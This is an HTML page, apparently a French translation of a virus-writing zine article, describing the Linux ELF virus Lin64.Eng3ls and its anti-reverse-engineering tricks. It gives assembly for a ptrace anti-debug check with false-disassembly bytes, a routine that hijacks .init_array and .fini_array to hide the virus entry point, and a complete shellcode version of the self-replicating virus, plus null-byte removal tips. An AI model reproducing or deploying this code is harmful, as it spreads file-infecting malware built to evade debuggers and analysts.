@@ -1,0 +1,285 @@
+<html>
+<head>
+<title>tmp.0ut</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d10;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 14px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<!-- Translation by 0xNinja 20220704 -->
+<center><div style="display: inline-block; text-align: left;"><pre>
+                                                            ┌───────────────────────┐
+                                                            ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                            │ █   █ █ █ █   █       │
+                                                            │ █   █ █ █ █▀▀▀▀       │
+                                                            │ █   █   █ █     ▄     │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄   ▄ │
+                                                            │                 █   █ │
+                                                            │                 █   █ │
+                                                            │                 █▄▄▄█ │
+                                                            │                 ▄▄▄▄▄ │
+                                                            │                   █   │
+Lin64.Eng3ls : des techniques d'anti-RE dans un virus Linux │                   █   │
+~ S01den & sblip                                            └───────────────────█ ──┘
+
+[ Traduction par 0xNinja ]
+
+Écrit avec amour par S01den.
+mail : S01den@protonmail.com
+
+--- Introduction ---
+
+Avec Sblip, nous avons travaillé pendant une semaine sur Lin64.Eng3ls pour un
+évènement privé. Eng3ls est en fait Lin64.Kropotkine[0], la méthode d'infection est
+toujours le bon vieux PT_NOTE dans le segment PT_LOAD, mais nous avons ajouté des
+techniques d'obfuscation.
+
+En effet, Kropotkin n'est pas furtif du tout : le point d'entrée des binaires
+infectés est modifié pour pointer directement sur le virus, et le code viral est
+en clair (facile à analyser).
+
+Pour pallier ces problèmes, nous avons fait un "chiffreur/déchiffreur" à base de xor
+oligomorphique (très original vous me direz) pour le corps du virus, avec la clé qui
+change à chaque infection pour que le code répliqué soit différent.
+
+Cependant ce polymorphisme du pauvre a comme grand désavantage d'avoir un code de
+déchiffreur qui ne change pas.
+
+C'est pourquoi, sans marabouterie, un reverser pourra comprendre assez vite comment
+le virus est chiffré, et ce qu'il fait.
+
+C'est pourquoi j'ai implémenté pour la première fois dans un de mes virus, la
+technique de "false-disassembly" polymorfique (ou simplement "faux polymorphisme")
+pour obfusquer le déchiffreur.
+
+Allez voir mon papier sur cette technique pour comprendre comment ça fonctionne et
+les résultats ! (Il suffit de tourner la page du zine)
+
+Mais il subsidait encore un problème : le point d'entrée des binaires infectés
+pointe vers le virus, pas discret du tout !
+Voyons voir comment nous avons résolu ça...
+
+--- Une technique d'obsursissement de point d'entrée pour ELF ---
+
+/!\ Cette technique ne fonctionne pas pour les binaires avec PIE /!\
+
+L'obsursissement de point d'entrée (OPE) est simplement l'action, pour un virus, de
+cacher l'adresse de sa première instruction.
+
+Dans les virus sans OPE, le point d'entrée d'un programme infecté est modifié pour
+pointer vers le début du virus, alors que dans des virus avec OPE, comme ici, le
+virus est appelé par un autre moyen. Que ça soit en cachant un jump dans le code de
+l'hôte ou bien, comme ici, en abusant une spécificité du format d'exécutable.
+
+Dans les ELFs le point d'entrée n'est, en fait, pas la première adresse à être
+exécutée quand le programme est lancé.
+
+Il y a des routines d'initialisation de la glibc, qui in fine chargent main().
+
+Je ne vais pas expliquer en détails comment ça fonctionne, il existe déjà un super
+papier à ce sujet[1]. Il faut simplement garder à l'esprit que nous allons détourner
+les sections .init_array et .fini_array, qui contiennent respectivement un pointeur
+vers le constructeur et un pointeur vers le destructeur du binaire.
+
+C'est pourquoi l'adresse du code dans .init_array est exécuté avant le point
+d'entrée. C'est exactement ce que nous voulons !
+
+J'ai choisi d'implémenter dans un premier temps une petite technique d'anti-debug,
+une vérification de ptrace pour voir si le processus est tracé (donc debugué ou
+stracé) ou pas.
+Le classique "if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) exit(0);"...
+Facile à contrer (patch le virus, ou mettre rax = 0 dans GDB au moment de la
+comparaison)...
+Donc je l'ai rendu plus dur à détecter !
+
+------------------------- FIN DE PAGE -----------------------------------------------
+check_dbg:
+    push rbp
+    mov rbp, rsp
+
+    jmp jmp_over4+2
+    jmp_over4:
+      db `\x41\xba` ; false disassembly
+    mov rax, 101 ; sys_ptrace
+    xor rdi, rdi ; PTRACE_TRACEME
+    xor rsi, rsi
+    xor r10, r10
+    xor rdx, rdx
+    inc rdx
+    jmp jmp_over6+2
+    jmp_over6:
+      db `\xe9\x94` ; false disassembly
+    syscall
+
+    jmp jmp_over5+2
+    jmp_over5:
+      db `\x49\x81` ; false disassembly
+    cmp rax, 0
+    jge continue
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+
+    continue:
+    pop rbp
+    ret
+-------------------------------------------------------------------------------------
+
+J'ai mis des octets de false-disassembly (qui changent à chaque infection) dans la
+routine et fais en sorte de l'appeller avant main() en abusant .init_array.
+Et donc, si debugué, le virus stop son exécution, même avec un point d'arrêt callé
+sur le point d'entrée.
+
+Concernant le virus, je l'appel à la fin en abusant .fini_array.
+Voici les routines que j'ai écris pour analyser les entêtes de sections, pour trouver
+.init_array et .fini_array et les modifier.
+
+------------------------- FIN DE PAGE -----------------------------------------------
+parse_shdr:
+  xor rcx, rcx
+  xor rdx, rdx
+  mov cx, word [rax+e_hdr.shnum]     ; rcx = # of entries in the program header table
+  mov rbx, qword [rax+e_hdr.shoff]   ; rbx = offset of the program header table
+  mov dx, word [rax+e_hdr.shentsize] ; rdx = size of a program header table entry
+
+  loop_shdr:
+    add rbx, rdx
+    dec rcx
+    cmp dword [rax+rbx+e_shdr.type], 0x0E ; 0x0F = SHT_INIT_ARRAY, the section we're 
+                                          ; looking to modify to put the debugging 
+                                          ; check (.init_array)
+    je ctor_found
+    cmp dword [rax+rbx+e_shdr.type], 0x0F ; 0x0F = SHT_FINI_ARRAY, the section we're 
+                                          ; looking to modify to EPO (.fini_array)
+    je dtor_found
+    cmp rcx, 0
+    jg loop_shdr
+
+dtor_found:
+  mov rdi, qword [rax+rbx+e_shdr.offset]
+  mov [rax+rdi], r9 ; r9 holds the addr of the converted segment, the one where we
+                    ; are writing the virus
+  jmp write_vx
+
+ctor_found:
+  mov rdi, qword [rax+rbx+e_shdr.offset]
+  add r9, 0x86 ; r9+0x86 = the addr where check_dbg begins
+  mov [rax+rdi], r9
+  sub r9, 0x86
+  jmp loop_shdr
+-------------------------------------------------------------------------------------
+
+--- Conclusion ---
+
+Modifier un point d'entrée c'est boiteux, il faut obsursir ce dernier avec des
+astuces comme le détournement de .init_array et .fini_array à la place.
+
+Ajouter quelques ruses d'anti-RE pour améliorer vos virus : une pincée de chiffrement
+par ci, une cuillèrée de détection de debug par là...
+
+J'espère que vous avez aprécié cet article et que vous avez appris des choses.
+
+Pour aller plus loin, j'ai fais un crackme avec les mêmes techniques que Eng3ls.
+
+Juste ici : https://crackmes.one/crackme/6049f27f33c5d42c3d016dea
+
+--- Bonus ---
+
+J'ai fais une version sans Null-byte du virus.
+Code sans Null-byte + Position Independent = shellcode \o/
+Donc voici une version shellcode du virus :
+
+unsigned char shellcode[] = 
+    "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc9\x4d"
+    "\x31\xc0\x49\x89\xe6\x48\x81\xc4\xe8\xc3\x11\x11\x48\x81\xec\xde"
+    "\xc0\x11\x11\x49\x89\xe7\xeb\x7c\x58\x48\x2d\x87\xc1\x11\x11\x48"
+    "\x05\xde\xc0\x11\x11\x50\x41\x5c\x68\xe8\xc3\x11\x11\x5e\x48\x81"
+    "\xee\xde\xc0\x11\x11\x48\x81\xc6\xe8\xc3\x11\x11\x48\x81\xee\xde"
+    "\xc0\x11\x11\x48\x31\xff\x6a\x07\x5a\x6a\x22\x41\x5a\x6a\x09\x58"
+    "\x0f\x05\x48\x89\xc3\x56\x59\xb0\x54\x48\x31\xd2\x41\x8a\x14\x3c"
+    "\x48\x81\xc7\xde\xc0\x11\x11\x48\x81\xff\x86\xc1\x11\x11\x76\x02"
+    "\x30\xc2\x48\x81\xef\xde\xc0\x11\x11\x88\x14\x3b\x48\xff\xc7\xe2"
+    "\xdb\x49\x89\xdf\x48\x81\xc3\x87\xc1\x11\x11\x48\x81\xeb\xde\xc0"
+    "\x11\x11\xff\xe3\xe8\x7f\xff\xff\xff\x1c\xd5\x90\x5e\x57\x54\x54"
+    "\x1c\xd5\x90\x5e\x57\x54\x54\x1c\xd5\x90\x54\x55\x54\x54\xbd\x6b"
+    "\x56\x54\x54\x0b\xec\x56\x54\x54\x54\x1c\x65\xa2\x5b\x51\x1c\xdd"
+    "\x93\xec\x8d\x54\x54\x54\x1c\xdd\xb2\xee\x54\x50\x54\x54\x5b\x51"
+    "\x1c\xd7\xac\x54\x5b\xd8\xb1\x55\x54\x54\x1d\xdd\x91\x1c\x65\x8f"
+    "\x1c\xdd\xb4\x1c\xd7\x94\x47\x1c\xdd\x92\xeb\x55\x54\x54\x54\x1c"
+    "\x65\x9d\xde\x18\x70\x46\x07\xbc\x42\x54\x54\x54\x0f\x32\xdf\x10"
+    "\x70\x44\x1c\x55\x97\x1c\x55\x90\x18\x6d\xbf\x28\x87\xbd\xf9\x55"
+    "\x54\x54\x1c\xdd\xb1\x1c\xd7\xad\x5c\x21\x05\x1c\xdd\xa3\xec\x56"
+    "\x54\x54\x54\xea\x56\x50\x54\x54\x5b\x51\x1c\xd7\xac\x54\x2a\x68"
+    "\x1c\xdd\x97\x1c\xdd\xb2\x18\x7d\xba\xec\x50\x54\x54\x54\x5b\x51"
+    "\x1d\xdd\x8c\x1c\xdf\x22\x64\xeb\x54\x54\x54\x54\xee\x52\x54\x54"
+    "\x54\x19\x65\x9d\x15\xee\x55\x54\x54\x54\x1c\x65\x94\xec\x5d\x54"
+    "\x54\x54\x5b\x51\xd5\x6c\x2b\x11\x18\x12\x20\x45\xec\x57\x54\x54"
+    "\x54\x1c\xdd\x8b\x5b\x51\x1c\x65\x94\x1c\xdd\xb8\x97\xd4\x2c\x50"
+    "\x56\x20\x56\xbf\xb3\x32\xd7\x2c\x44\x56\x20\x56\xbf\x8a\xd5\x2c"
+    "\x5d\x8a\x94\xf9\x8a\x21\x53\x1c\x65\x94\x1c\xdd\xb8\x97\x1c\x65"
+    "\x9d\x1c\x65\x86\x32\xdf\x1c\x6c\x1c\xdf\x0c\x74\x32\xdf\x04\x62"
+    "\x1c\x55\x87\x1c\xab\x9d\xd7\x68\x4c\x50\x20\x52\x1c\xd7\xad\x54"
+    "\x2b\xba\x93\x14\x5d\x8a\x94\xf9\x8a\x93\x50\x4c\x55\x54\x54\x54"
+    "\x93\x10\x4c\x50\x53\x54\x54\x54\x15\xed\x54\x54\x54\x58\x1d\x55"
+    "\xa5\x18\xdd\x18\x4c\x44\x1c\xdf\x28\x4c\x74\x1c\xd5\x93\x5e\x57"
+    "\x54\x54\x1c\xdd\x28\x4c\x74\x1c\xdf\x28\x4c\x7c\x1c\xd5\x93\x5e"
+    "\x57\x54\x54\x1c\xdd\x28\x4c\x7c\x1c\xdd\x20\x4c\x5c\x1c\x65\x9d"
+    "\x1c\x65\x86\x32\xdf\x1c\x68\x1c\xdf\x0c\x7c\x32\xdf\x04\x6e\x1c"
+    "\x55\x87\x1c\xab\x9d\xd7\x28\x4c\x50\x5b\x20\x52\x1c\xd7\xad\x54"
+    "\x2b\xb9\x1c\xdf\x28\x4c\x4c\x18\xdd\x58\x6c\xee\x50\x54\x54\x54"
+    "\x1c\xdd\x93\xec\x4e\x54\x54\x54\x5b\x51\xec\x5f\x54\x54\x54\x5b"
+    "\x51\x5b\x65\x32\x61\xf9\x8a\x15\xde\x1b\x3c\x15\xdc\x13\x3c\x1c"
+    "\x65\x86\x1c\x65\x8f\x15\xde\x48\x43\x15\xdc\xc8\x43\x5e\x57\x54"
+    "\x54\x1c\xab\x96\x1c\xd5\xae\xfd\x54\x54\x54\x21\xbc\x15\xde\x48"
+    "\x43\x64\x97\x15\xdc\xc8\x43\x5e\x57\x54\x54\x1c\xab\x96\x1c\xd5"
+    "\xae\x5e\x57\x54\x54\x21\xb2\x18\xdd\x93\x18\xdd\xaa\x1c\xd5\x92"
+    "\x5e\x57\x54\x54\xee\x5e\x57\x54\x54\x1c\xd7\x96\x7a\xec\x55\x54"
+    "\x54\x54\x5b\x51\xec\x57\x54\x54\x54\x5b\x51\x1c\xdd\xb8\x97\xec"
+    "\x55\x54\x54\x54\x1c\x65\xab\x1c\xab\x93\x3c\x5e\x0c\x0b\x0c\x1c"
+    "\xdd\xb2\xee\x50\x54\x54\x54\x5b\x51\xec\x68\x54\x54\x54\x5b\x51"
+    "\x1c\x65\x9d\x1c\x65\x8f\x1c\x65\x94\x1c\x65\x86\x97\x1c\xdf\x50"
+    "\x70\x97\xbc\xe8\xa9\xab\xab\x7a\x54\x54";
+
+Ne soyez pas stupides et ne diffusez pas ça n'importe où.
+Nous ne sommes pas responsables de ce que vous en faites.
+
+--&gt; 2 techniques pour faire du code sans nullbytes :
+
+1) Remplacer les mov par des push
+Exemple :
+
+b809000000     mov eax, 9  ----&gt; 6a09 push 0x9
+                                 58   pop rax
+2) La technique add/sub :
+Des fois les valeurs ajoutées à un registre utilise des nullbytes.
+On peut les retirer en add/sub une valeur.
+Exemple :
+
+4881c4890300  add rsp, 0x389  ----&gt; 4881c4e8c311  add rsp, 0x1111c3e8
+          ^                         // 0x1111c3e8 = 0x389 + 0x1111c0de
+                                    4881ecdec011  sub rsp, 0x1111c0de
+
+
+--- Notes et Références ---
+[0] https://github.com/vxunderground/MalwareSourceCode
+      /blob/main/VXUG/Linux.Kropotkine.asm
+[1] Abusing .CTORS and .DTORS for fun 'n profit
+    https://www.exploit-db.com/papers/13234
+
+--- Source ---
+
+- <a href="Linux.Eng3ls.asm">Linux.Eng3ls.asm</a>
+</pre></div></center></body></html>
